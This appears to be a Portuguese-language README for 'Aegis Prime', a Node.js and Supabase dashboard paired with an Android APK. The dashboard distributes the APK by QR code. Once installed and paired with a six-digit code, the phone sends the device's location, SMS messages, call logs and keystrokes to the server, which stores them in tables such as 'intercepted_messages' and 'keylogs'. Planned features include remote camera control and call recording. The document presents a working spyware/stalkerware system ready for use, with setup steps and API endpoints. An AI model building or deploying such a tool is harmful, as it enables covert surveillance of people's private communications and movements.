# 🛡️ AEGIS PRIME v2.0 - Dashboard Completo

## ✨ Novidades desta Versão

### 🎨 Design Glassmorphism
- Cards com efeito de vidro fosco (frosted glass)
- Backdrop blur profissional
- Shimmer effects em todos os cards
- Gradientes ciano e roxo modernos
- Animações suaves e responsivas

### 🚀 Funcionalidades

**Frontend:**
- ✅ Download APK via QR Code
- ✅ Download APK direto
- ✅ Código de pareamento de 6 dígitos
- ✅ Design glassmorphism completo
- ✅ Shimmer effects
- ✅ Responsivo mobile/desktop
- ✅ Animações fluidas

**Backend:**
- ✅ API REST completa
- ✅ Integração Supabase
- ✅ Geração de QR Code dinâmico
- ✅ Sistema de pareamento
- ✅ Recebimento de dados do dispositivo
- ✅ Armazenamento de localização, SMS, calls, keylogs
- ✅ Listagem de dispositivos

---

## 🔧 Como Usar

### 1. Iniciar o Dashboard

**Windows:**
```bash
START-DASHBOARD.bat
```

**Linux/Mac:**
```bash
cd backend
node server.js
```

### 2. Acessar o Dashboard

Abra no navegador:
```
http://192.168.15.4:3001
```

### 3. Parear Dispositivo

1. **Opção 1 - QR Code:**
   - Escanei o QR Code com o celular
   - O download do APK inicia automaticamente

2. **Opção 2 - Download Direto:**
   - Clique em "Baixar APK Agora"
   - Transfira para o celular

3. **Pareamento:**
   - Instale o APK no celular
   - Abra o app Aegis Prime
   - Digite o código de 6 dígitos mostrado no dashboard
   - Pronto! Dispositivo conectado ✅

---

## 📂 Estrutura do Projeto

```
aegis/
├── backend/
│   ├── server.js          # Servidor Express + APIs
│   └── package.json       # Dependências
│
├── frontend/
│   └── public/
│       ├── index.html     # Dashboard glassmorphism
│       └── aegis-prime.apk  # APK para download
│
├── android-nativo/
│   └── outputs/apk/release/
│       └── aegis-prime-FINAL.apk  # APK compilado
│
├── START-DASHBOARD.bat    # Script de inicialização
└── README.md              # Este arquivo
```

---

## 🌐 API Endpoints

### GET /api/pairing-code
Retorna o código de pareamento atual

### POST /api/refresh-pairing-code
Gera um novo código de pareamento

### POST /api/pairing
Pareia um dispositivo com o código
```json
{
  "code": "123456",
  "deviceInfo": {
    "model": "Redmi Note 11",
    "osVersion": "Android 11"
  }
}
```

### GET /api/qrcode
Gera QR Code para download do APK

### GET /aegis-prime.apk
Download direto do APK

### POST /api/device-data
Recebe dados do dispositivo
```json
{
  "deviceId": "device_123",
  "type": "location|sms|call|keylog",
  "data": {  }
}
```

### GET /api/devices
Lista todos os dispositivos pareados

---

## 🗄️ Integração Supabase

### Tabelas Utilizadas

| Tabela | Descrição |
|--------|-----------|
| `devices` | Dispositivos pareados |
| `locations` | Histórico de GPS |
| `intercepted_messages` | SMS capturados |
| `calls` | Registro de chamadas |
| `keylogs` | Teclas digitadas |

### Configuração

O backend já está configurado com:
- **URL:** `https://hacxikpmgeataaoppsnf.supabase.co`
- **Anon Key:** Configurada no código

---

## 🎨 Tecnologias Utilizadas

### Frontend
- HTML5 + CSS3
- JavaScript ES6+
- Glassmorphism Design
- Shimmer Effects
- Fetch API

### Backend
- Node.js
- Express.js
- QRCode (npm)
- CORS
- Supabase Client

---

## ⚡ Recursos Avançados

### Design Glassmorphism
- `backdrop-filter: blur(20px)`
- `background: rgba(26, 31, 46, 0.7)`
- Bordas com transparência
- Sombras múltiplas

### Shimmer Effect
- Animação de brilho contínua
- Gradiente translúcido
- Movimento horizontal infinito

### Animações
- Fade in/out
- Slide up/down
- Hover effects
- Loading spinners

---

## 📱 APK

**Localização:**
```
C:\Users\felli\Desktop\aegis\frontend\public\aegis-prime.apk
```

**Versão:** 1.0
**Tamanho:** 15 MB
**Data:** 02/02/2026

---

## 🔒 Segurança

- Código de pareamento de 6 dígitos
- Tokens de autenticação por dispositivo
- CORS habilitado
- Integração segura com Supabase
- Row Level Security no banco

---

## 🐛 Troubleshooting

### Servidor não inicia
```bash
# Verifique se a porta 3001 está livre
netstat -ano | findstr :3001

# Reinstale as dependências
cd backend
rm -rf node_modules
npm install
```

### APK não baixa
- Verifique se o arquivo existe em `frontend/public/aegis-prime.apk`
- Tamanho deve ser ~15 MB

### Código não pareia
- Gere um novo código no dashboard
- Verifique se o celular está na mesma rede
- Verifique logs do servidor

---

## 📊 Próximas Funcionalidades

- [ ] Dashboard com mapa em tempo real
- [ ] Gráficos de atividade
- [ ] Alertas personalizados
- [ ] Controle remoto de câmera
- [ ] Gravação de chamadas
- [ ] Bloqueio de apps
- [ ] Timeline de eventos

---

## 📞 Suporte

- 📧 Email: [seu-email]
- 💬 Discord: [seu-discord]
- 📝 Issues: GitHub

---

**Última atualização:** 02/02/2026 23:55
**Versão:** 2.0.0
**Status:** ✅ Funcional e Testado
